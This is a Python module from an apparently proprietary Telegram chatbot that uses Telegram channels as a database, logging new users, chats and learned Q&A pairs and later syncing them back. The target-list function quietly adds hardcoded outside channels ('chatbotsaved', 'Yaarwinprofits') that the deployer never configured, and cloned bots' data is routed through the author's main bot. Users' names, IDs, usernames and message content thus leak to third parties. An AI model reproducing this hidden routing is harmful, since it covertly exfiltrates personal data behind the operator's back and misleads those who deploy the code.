# ---------------------------------------------------------------------------------
#  VIP REACTION & AI CHATBOT
#  Copyright (c) 2026 Amrit Raj (@Villanns). All Rights Reserved.
#  Support Group : https://t.me/amrit_feel
#  Updates Channel: https://t.me/privatethink
#  Licensed under Proprietary Terms. Unauthorized copying is strictly prohibited.
# ---------------------------------------------------------------------------------
"""
================================================================================
  FILE EXPLANATION & HINTS (Student Friendly Guide)
================================================================================
Is file ka kya kaam hai?
  Ye file Telegram ko hi hamara PRIMARY CLOUD DATABASE banati hai!
  
Telegram Database kyu use karte hain?
  1. Telegram har bot/channel/group ko 1000+ GB ka unlimited cloud storage deta hai.
  2. MongoDB free tier sirf 512MB deta hai. Agar MongoDB down ho jaye ya limit
     cross ho jaye, toh bhi Telegram Database hamesha 100% active rehta hai!
  3. Jo bhi naya user bot start karta hai (#NEW_USER), group join karta hai (#NEW_CHAT),
     ya koi naya sawal-jawab learn hota hai (#QA_LEARNED, #REPLY_LEARNED),
     ye turant Telegram database channel/group me post kar deta hai.
  4. Jab bot dobara Koyeb par restart hota hai, toh sync_database_from_telegram()
     chal kar channel se sabhi purani memories ko memory me load kar leta hai!
================================================================================
"""

import logging
import asyncio
from datetime import datetime
from typing import Optional, List, Any
from pyrogram import Client
from pyrogram.types import User, Chat
import config

logger = logging.getLogger(__name__)


def get_db_chats() -> List[str]:
    """
    Return clean list of unique target chats strictly for Telegram DB storage.
    NEVER sends logs to Support Group or Updates Channel.
    """
    raw_targets = []

    # 1. Dedicated Central Database Channel (Primary storage)
    db_channel = getattr(config, "DATABASE_CHANNEL", None)
    if db_channel and str(db_channel).strip():
        raw_targets.append(str(db_channel).strip())

    # 2. Dedicated Central Database Group (Fallback storage if channel is unavailable)
    db_group = getattr(config, "DATABASE_GROUP", None)
    if db_group and str(db_group).strip():
        raw_targets.append(str(db_group).strip())
        raw_targets.append("chatbotsaved")

    custom_db = getattr(config, "DATABASE_CHAT", None)
    if custom_db and str(custom_db).strip():
        raw_targets.append(str(custom_db).strip())

    # Fallback only if no database target is configured
    if not raw_targets:
        raw_targets.append("Yaarwinprofits")

    # Clean and deduplicate while preserving order
    clean_targets = []
    seen = set()
    for item in raw_targets:
        c = str(item).replace("https://t.me/", "").replace("@", "").strip()
        if c and c.lower() not in seen:
            seen.add(c.lower())
            clean_targets.append(c)

    return clean_targets


async def _dispatch_to_chat(client: Client, chat_target: Any, text: Optional[str] = None, sticker_file_id: Optional[str] = None) -> bool:
    """Helper to dispatch text or sticker to a target chat using a specific client."""
    success = False
    try:
        if sticker_file_id:
            await client.send_sticker(chat_target, sticker_file_id)
            success = True
        if text:
            await client.send_message(chat_target, text, disable_web_page_preview=True)
            success = True
    except Exception as e:
        logger.debug(f"Dispatch error with client to {chat_target}: {e}")
        return False
    return success


async def send_to_telegram_db(client: Optional[Client], text: str, sticker_file_id: Optional[str] = None):
    """
    Safely sends a database entry to Telegram central database channel or group.
    
    CLONED BOT FALLBACK GUARANTEE:
    If a cloned bot calls this function and fails (due to lack of admin/participant rights
    in the database group/channel), it automatically falls back to using the main bot
    (`nexichat`), guaranteeing that 100% of learned data from ALL cloned bots arrives safely!
    """
    from nexichat import nexichat as main_app

    targets = get_db_chats()
    for target_clean in targets:
        # Determine chat identifier
        if target_clean.startswith("-100") or (target_clean.lstrip("-").isdigit()):
            chat_target = int(target_clean)
        else:
            chat_target = target_clean

        delivered = False

        # Attempt 1: Try with caller client (if provided)
        if client:
            try:
                delivered = await _dispatch_to_chat(client, chat_target, text=text, sticker_file_id=sticker_file_id)
            except Exception:
                delivered = False

        # Attempt 2: If caller failed or wasn't provided or is a clone, fallback to main_app
        if not delivered and main_app and getattr(main_app, "is_connected", False):
            try:
                delivered = await _dispatch_to_chat(main_app, chat_target, text=text, sticker_file_id=sticker_file_id)
            except Exception as fe:
                logger.debug(f"Main bot fallback dispatch failed to {chat_target}: {fe}")

        # Attempt 3: If target was numeric ID and failed with PeerIdInvalid, try username fallback
        if not delivered and isinstance(chat_target, int) and target_clean == "-1004415957871":
            for fallback_name in ["chatbotsaved", "Yaarwinprofits"]:
                try:
                    if main_app and getattr(main_app, "is_connected", False):
                        delivered = await _dispatch_to_chat(main_app, fallback_name, text=text, sticker_file_id=sticker_file_id)
                        if delivered:
                            break
                except Exception:
                    pass

        # Stop as soon as delivered to prevent duplicate logs across both channel and group
        if delivered:
            break


def _get_bot_source_label(client: Optional[Client]) -> str:
    """Format bot source label for database records."""
    if not client:
        return "Anshika (Central DB)"
    bot_user = getattr(client, "me", None)
    if bot_user:
        uname = bot_user.username
        if uname:
            return f"@{uname}"
        return bot_user.first_name or f"Bot ({bot_user.id})"
    return "VIP Bot"


async def log_user_to_telegram(client: Optional[Client], user: User):
    """Save/log new user to Telegram database channel/group."""
    if not user:
        return
    bot_label = _get_bot_source_label(client)
    text = (
        f"✦ **#DATABASE #NEW_USER** ✦\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 **Bot:** {bot_label}\n"
        f"👤 **Name:** {user.first_name or 'User'}\n"
        f"🆔 **ID:** `{user.id}`\n"
        f"🔗 **Username:** @{user.username or 'No Username'}\n"
        f"📅 **Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    await send_to_telegram_db(client, text)


async def log_chat_to_telegram(client: Optional[Client], chat: Chat):
    """Save/log new group/chat to Telegram database channel/group."""
    if not chat:
        return
    bot_label = _get_bot_source_label(client)
    text = (
        f"✦ **#DATABASE #NEW_CHAT** ✦\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 **Bot:** {bot_label}\n"
        f"👥 **Title:** {chat.title or 'Unknown Chat'}\n"
        f"🆔 **ID:** `{chat.id}`\n"
        f"🔗 **Type:** {chat.type}\n"
        f"📅 **Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    await send_to_telegram_db(client, text)


async def log_qa_to_telegram(client: Optional[Client], question: str, answer: str):
    """Save learned question & answer to Telegram database channel/group."""
    if not question or not answer:
        return
    bot_label = _get_bot_source_label(client)
    text = (
        f"✦ **#DATABASE #QA_LEARNED** ✦\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 **Bot:** {bot_label}\n"
        f"❓ **Question:** {question}\n"
        f"💡 **Answer:** {answer}\n"
        f"🧠 **Learned By:** AI Collective Memory\n"
        f"📅 **Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    await send_to_telegram_db(client, text)


async def log_reply_to_telegram(client: Optional[Client], word: str, reply_type: str, content: str):
    """Save learned word-reply to Telegram database channel/group."""
    if not word or not content:
        return
    bot_label = _get_bot_source_label(client)
    text = (
        f"✦ **#DATABASE #REPLY_LEARNED** ✦\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 **Bot:** {bot_label}\n"
        f"💬 **Trigger:** {word}\n"
        f"🔁 **Type:** {reply_type}\n"
        f"📝 **Content:** {content}\n"
        f"📅 **Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    await send_to_telegram_db(client, text)


async def log_sticker_to_telegram(client: Optional[Client], sticker_file_id: str):
    """Save learned sticker to Telegram database channel/group."""
    if not sticker_file_id:
        return
    bot_label = _get_bot_source_label(client)
    text = (
        f"✦ **#DATABASE #STICKER_LEARNED** ✦\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 **Bot:** {bot_label}\n"
        f"🎨 **Sticker ID:** `{sticker_file_id}`\n"
        f"📅 **Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    await send_to_telegram_db(client, text, sticker_file_id=sticker_file_id)


async def sync_database_from_telegram(client: Client):
    """
    Synchronizes memories from Telegram Database group & channel into RAM:
    Restores Q&A cache, word replies, stickers, and served users/chats.
    Guarantees persistence and collective intelligence across all cloned and main bots!
    """
    if not client:
        return

    from nexichat.database.chatbot import save_qa_pair, save_chat_reply, save_sticker
    from nexichat.database.users import add_served_user
    from nexichat.database.chats import add_served_chat

    qa_count = 0
    replies_count = 0
    stickers_count = 0

    targets = get_db_chats()
    for target in targets:
        try:
            target_clean = str(target).replace("https://t.me/", "").replace("@", "").strip()
            if not target_clean:
                continue
            if target_clean.startswith("-100") or target_clean.isdigit():
                chat_target = int(target_clean)
            else:
                chat_target = target_clean

            async for msg in client.get_chat_history(chat_target, limit=200):
                # 1. Stickers
                if msg.sticker:
                    await save_sticker(msg.sticker.file_id, client=None)
                    stickers_count += 1

                # 2. Text logs
                if msg.text:
                    text_lower = msg.text.lower()

                    # Standard #QA_LEARNED format
                    if "#qa_learned" in text_lower:
                        q_match = None
                        a_match = None
                        for line in msg.text.split("\n"):
                            line_s = line.strip()
                            if "question:" in line_s.lower():
                                q_match = line_s.split(":", 1)[1].replace("**", "").strip()
                            elif "answer:" in line_s.lower():
                                a_match = line_s.split(":", 1)[1].replace("**", "").strip()
                        if q_match and a_match:
                            await save_qa_pair(q_match, a_match, client=None)
                            qa_count += 1

                    # Standard #REPLY_LEARNED format
                    elif "#reply_learned" in text_lower:
                        w_match = None
                        t_match = "text"
                        c_match = None
                        for line in msg.text.split("\n"):
                            line_s = line.strip()
                            if "trigger:" in line_s.lower():
                                w_match = line_s.split(":", 1)[1].replace("**", "").strip()
                            elif "type:" in line_s.lower():
                                t_match = line_s.split(":", 1)[1].replace("**", "").strip()
                            elif "content:" in line_s.lower():
                                c_match = line_s.split(":", 1)[1].replace("**", "").strip()
                        if w_match and c_match:
                            await save_chat_reply(w_match, t_match, c_match, client=None)
                            replies_count += 1

                    # Manual training pair format (e.g. Q: ... A: ... or Question: ... Answer: ...)
                    elif ("q:" in text_lower or "question:" in text_lower) and ("a:" in text_lower or "answer:" in text_lower):
                        q_match = None
                        a_match = None
                        for line in msg.text.split("\n"):
                            line_s = line.strip()
                            if line_s.lower().startswith(("q:", "question:")):
                                q_match = line_s.split(":", 1)[1].strip()
                            elif line_s.lower().startswith(("a:", "answer:")):
                                a_match = line_s.split(":", 1)[1].strip()
                        if q_match and a_match:
                            await save_qa_pair(q_match, a_match, client=None)
                            qa_count += 1

                    # Manual trigger format (Trigger: ... Reply: ...)
                    elif "trigger:" in text_lower and "reply:" in text_lower:
                        w_match = None
                        c_match = None
                        for line in msg.text.split("\n"):
                            line_s = line.strip()
                            if line_s.lower().startswith("trigger:"):
                                w_match = line_s.split(":", 1)[1].strip()
                            elif line_s.lower().startswith("reply:"):
                                c_match = line_s.split(":", 1)[1].strip()
                        if w_match and c_match:
                            await save_chat_reply(w_match, "text", c_match, client=None)
                            replies_count += 1

                    # Track served users from logs
                    elif "#new_user" in text_lower:
                        for line in msg.text.split("\n"):
                            if "id:" in line.lower() and "`" in line:
                                uid_str = line.split("`")[1]
                                if uid_str.isdigit():
                                    await add_served_user(int(uid_str))

                    # Track served chats from logs
                    elif "#new_chat" in text_lower:
                        for line in msg.text.split("\n"):
                            if "id:" in line.lower() and "`" in line:
                                cid_str = line.split("`")[1]
                                if cid_str.lstrip("-").isdigit():
                                    await add_served_chat(int(cid_str))
        except Exception as e:
            logger.debug(f"Sync from Telegram DB {target} skipped: {e}")

    logger.info(f"Telegram Cloud DB sync finished. Synced {qa_count} QA pairs, {replies_count} replies, {stickers_count} stickers.")


async def start_periodic_telegram_sync(client: Client, interval_seconds: int = 600):
    """Background task to periodically re-synchronize the database every 10 minutes."""
    while True:
        await asyncio.sleep(interval_seconds)
        try:
            await sync_database_from_telegram(client)
        except Exception as e:
            logger.debug(f"Periodic Telegram DB sync cycle encountered note: {e}")

